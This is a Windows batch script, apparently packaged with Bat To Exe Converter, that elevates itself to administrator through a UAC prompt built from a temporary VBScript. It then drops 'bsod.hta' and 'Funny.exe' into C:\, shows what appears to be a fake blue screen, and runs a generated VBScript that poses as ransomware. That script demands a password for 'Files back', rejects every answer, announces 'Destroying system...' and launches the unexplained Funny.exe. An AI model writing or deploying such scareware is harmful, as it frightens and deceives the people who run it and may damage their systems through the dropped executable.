::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcA6DMm+pOpET/+b34OuDsXEzUfV/foDX3rGcHO8V+EzgcpM56nhJl89CBA9ZHg==
::fBE1pAF6MU+EWHreyHcjLQlHcA6DMm+pOpET/+b34OuDsXEzUfV/foDX3rGcHO8V+EzgcpM56lxPlsUVQh5Ae3I=
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBFVQgCRAE+1EbsQ5+n//Napp1pdUu0zfIrJ5rGKIucK/0eqcI4otg==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
:: Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

:: If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%cd%"
    cd /d "%~dp0"
    
:: --- Place your administrator commands below this line ---

move bsod.hta C:/bsod.hta
move Funny.exe C:/Funny.exe
cd C:/
start bsod.hta
del C:/password1.vbs
echo set wshshell = wscript.CreateObject("wscript.shell") >>  C:/password1.vbs
echo Dim message, sapi >>  C:/password1.vbs
echo message=InputBox("Enter your password","Files back") >>  C:/password1.vbs
echo x=msgbox("Password incorrect.", 0+16, "Files back") >>  C:/password1.vbs
echo message=InputBox("Enter your password","Files back") >>  C:/password1.vbs
echo x=msgbox("Password incorrect.", 0+16, "Files back") >>  C:/password1.vbs
echo message=InputBox("Enter your password","Files back") >> C:/password1.vbs
echo x=msgbox("Password incorrect.", 0+16, "Files back") >> C:/password1.vbs
echo x=msgbox("Ooooops, you got it wrong. Destroying system...", 0+16, "Files back") >> C:/password1.vbs
echo x=msgbox("HAHAHAHAHAHA!!!! I've been looking forward to this...", 0+64, "Files back") >> C:/password1.vbs
echo wshshell.run "Funny.exe" >> C:/password1.vbs
start password1.vbs
